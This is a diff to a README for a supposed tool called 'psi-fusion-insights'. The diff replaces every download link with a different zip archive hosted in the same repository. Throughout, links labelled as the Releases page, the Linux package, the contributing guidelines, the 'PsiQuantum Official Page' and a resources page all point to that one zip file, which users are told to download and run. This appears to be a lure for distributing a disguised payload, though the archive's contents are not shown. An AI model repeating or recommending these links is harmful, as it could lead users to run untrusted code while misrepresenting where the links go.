@@ -1,6 +1,6 @@
 # 🌟 psi-fusion-insights - Extract Insights from Fusion Tech Texts
 
-[![Download psi-fusion-insights](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip)](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip)
+[![Download psi-fusion-insights](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip)](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets the following requirements:
 
 To get the software, you can visit the Releases page. Click the button below to go there.
 
-[Download psi-fusion-insights](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip)
+[Download psi-fusion-insights](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -28,7 +28,7 @@ To get the software, you can visit the Releases page. Click the button below to 
 3. **Choose your file**: Depending on your operating system, select the appropriate file.
     - For Windows: Download the `.exe` file.
     - For macOS: Download the `.dmg` file.
-    - For Linux: Download the `https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip` file.
+    - For Linux: Download the `https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip` file.
 4. **Start the download**: Click on the file to begin downloading it to your computer.
 5. **Locate the downloaded file**: Once the download completes, find the file in your downloads folder.
 
@@ -49,7 +49,7 @@ To get the software, you can visit the Releases page. Click the button below to 
 
 #### Linux:
 
-1. Extract the downloaded `https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip` file in your preferred directory.
+1. Extract the downloaded `https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip` file in your preferred directory.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application with the command:
    ```bash
@@ -90,13 +90,13 @@ For additional help, you can reach out through the issues section of this GitHub
 
 ## 📚 Contributing
 
-If you want to contribute to the project or report bugs, please visit our GitHub repository and follow the guidelines in the `https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip` file.
+If you want to contribute to the project or report bugs, please visit our GitHub repository and follow the guidelines in the `https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip` file.
 
 ## 🌐 Learn More
 
 For more insights on PsiQuantum fusion technology and its applications, please visit:
 
-- [PsiQuantum Official Page](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip)
-- [Quantum Computing Resources](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/insights-psi-fusion-3.8.zip)
+- [PsiQuantum Official Page](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip)
+- [Quantum Computing Resources](https://raw.githubusercontent.com/Reyan121212/psi-fusion-insights/main/psi_fusion_insights/fusion_psi_insights_3.5.zip)
 
 Feel free to explore the tools and resources available to enhance your understanding of this cutting-edge technology.
